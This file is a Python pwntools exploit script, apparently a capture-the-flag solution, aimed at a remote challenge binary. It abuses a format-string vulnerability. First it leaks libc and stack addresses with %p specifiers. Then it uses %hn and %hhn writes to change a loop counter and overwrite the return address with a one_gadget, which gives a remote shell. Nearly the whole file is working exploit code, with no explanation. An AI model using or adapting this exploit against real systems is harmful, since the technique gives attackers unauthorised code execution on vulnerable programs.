'''
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
'''

from pwn import *
# from LibcSearcher import *


local = 0
url, port = "node5.buuoj.cn", "27102" 
filename = "./pwn"
elf = ELF(filename)
libc = ELF("./libc.so.6") # 2.23-0ubuntu11.3
context(arch="amd64", os="linux")
# context(arch="i386", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    # context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    io = remote(url, port)

one_gadget_relative_addr = 0xf1247
libc_start_main_addr = 0x0000000000020750

def B():
    gdb.attach(io)
    pause()

def pwn():
    io.recvuntil(b'your name:')
    io.sendline(b'fa1c4')
    io.recvuntil(b'favourite food:')
    io.sendline(b'%9$p,%11$p,%17$p,%37$p')
    io.recvuntil(b"You like ")
    libc.address = int(io.recvuntil(b',', drop=True), 16) - libc_start_main_addr - 240
    stack_anchor = int(io.recvuntil(b',', drop=True), 16) - 0xe8
    ret_addr = stack_anchor + 0x08
    one_gadget_addr = libc.address + one_gadget_relative_addr

    # set i = 5
    local_vari_addr = stack_anchor - 0x0C
    local_vari_addr = local_vari_addr & 0xFFFF
    payload = b'%' + str(local_vari_addr).encode() + b'c%11$hn'
    io.recvuntil(b'favourite food:')
    # B()
    io.sendline(payload)
    payload = b'%' + str(0x5).encode() + b'c%37$hhn'
    io.recvuntil(b'favourite food:')
    io.sendline(payload)

    # hijack ret address
    ret_addr = ret_addr & 0xFFFF
    payload = b'%' + str(ret_addr).encode() + b'c%11$hn'
    io.sendlineafter(b'favourite food:', payload)
    payload = b'%' + str(one_gadget_addr & 0xFFFF).encode() + b'c%37$hn'
    io.sendlineafter(b'favourite food:', payload)

    payload = b'%' + str(ret_addr + 2).encode() + b'c%11$hn'
    io.sendlineafter(b'favourite food:', payload)
    payload = b'%' + str((one_gadget_addr >> 16) & 0xFFFF).encode() + b'c%37$hn'
    io.sendlineafter(b'favourite food:', payload)


if __name__ == "__main__":
    pwn()
    io.interactive()
